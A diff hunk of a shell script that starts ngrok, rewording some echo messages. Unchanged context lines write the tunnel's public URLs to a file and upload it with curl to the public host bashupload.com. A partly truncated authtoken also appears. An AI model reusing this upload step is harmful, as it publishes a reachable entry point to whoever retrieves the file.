@@ -33,8 +33,8 @@ sleep 20
 echo -e "Finish… to check status NGROK: \n http://127.0.01:4040"
 STATUSNGROK=$(curl -s http://127.0.0.1:4040/api/tunnels | jq '.tunnels | .[] | "\(.name) \(.public_url)"')
 echo -e "To stop service NGROK:\n ./ngrok service stop"
-echo -e "To setting configuration:\n ngrok.yml"
-echo -e "To change authtoken:\n ./ngrok config add-authtoken 2J8ncba…"
+echo -e "To setting configuration NGROK:\n ngrok.yml"
+echo -e "To change authtoken NGROK:\n ./ngrok config add-authtoken 2J8ncba…"
 echo -e "service online NGROK:\n" $STATUSNGROK
 echo "$STATUSNGROK" > ngrokdata.json
 curl bashupload.com -T ngrokdata.json
